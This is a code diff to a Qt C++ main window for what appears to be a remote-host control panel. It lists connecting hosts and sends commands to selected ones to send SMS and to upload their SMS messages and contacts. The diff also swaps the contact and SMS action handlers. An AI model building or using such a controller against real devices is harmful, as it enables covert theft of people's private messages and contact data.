@@ -6,22 +6,26 @@ MainWindow::MainWindow(QWidget *parent) :
     ui(new Ui::MainWindow)
 {
     ui->setupUi(this);
+    init();
     initView();
-    mServerManager.moveToThread(&mThread);
-    mThread.start();
-    mServerManager.start(8000);
+    updateView();
+    mSessionManager.start(8000);
 }
 
 MainWindow::~MainWindow()
 {
-    mThread.quit();
-    mThread.wait();
     delete ui;
+}
+
+void MainWindow::init()
+{
+    QObject::connect(&mSessionManager,SIGNAL(onNewSession(NetworkSession*)),this,SLOT(handleNewSession(NetworkSession*)));
 }
 
 void MainWindow::initView()
 {
-    QObject::connect(&mServerManager, SIGNAL(onIncomeHost(QString,QString,quint16)), &mModel, SLOT(putItem(QString,QString,quint16)));
+    QObject::connect(&mSessionManager, SIGNAL(onIncomeHost(QString,QHostAddress,quint16)), &mModel, SLOT(putItem(QString,QHostAddress,quint16)));
+    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
     ui->tableView->setModel(&mModel);
     ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
     ui->tableView->resizeColumnToContents(0);
@@ -45,4 +49,30 @@ void MainWindow::initView()
     ui->tableView->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
     ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));
 
+    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
+    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadSms()));
+    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadContact()));
+}
+
+void MainWindow::updateView()
+{
+    ui->hostCountLabel->setText(QString("Host: %1").arg(mModel.rowCount()));
+}
+
+void MainWindow::handleNewSession(NetworkSession* networkSession)
+{
+    ;
+}
+
+void MainWindow::sendSms()
+{
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "send_sms");
+}
+void MainWindow::loadSms()
+{
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "upload_sms");
+}
+void MainWindow::loadContact()
+{
+    mSessionManager.startSessionOnHosts(mModel.getSelectedHostAddr(), "upload_contact");
 }
